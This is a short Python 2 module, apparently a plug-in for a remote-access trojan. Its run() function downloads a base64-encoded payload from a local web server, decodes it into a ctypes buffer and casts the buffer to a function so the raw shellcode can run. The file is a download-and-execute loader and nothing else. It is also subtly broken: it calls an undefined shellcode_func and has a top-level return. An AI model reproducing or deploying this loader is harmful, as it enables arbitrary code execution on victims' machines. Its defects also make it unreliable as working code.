try:
  import urllib2
  import ctypes
  import base64
except Exception, e:
  return str(e)

def run(**args):
  try:
      url = "http://localhost:8000/sfile.bin"
      response = urllib2.urlopen(url)
      launch = base64.b64decode(response.read())
      launch_buffer = ctypes.create_string_buffer(launch, len(launch))
      launch_func   = ctypes.cast(launch_buffer, ctypes.CFUNCTYPE(ctypes.c_void_p))

      shellcode_func()
  except Exception, e:
      return str(e)
  
  
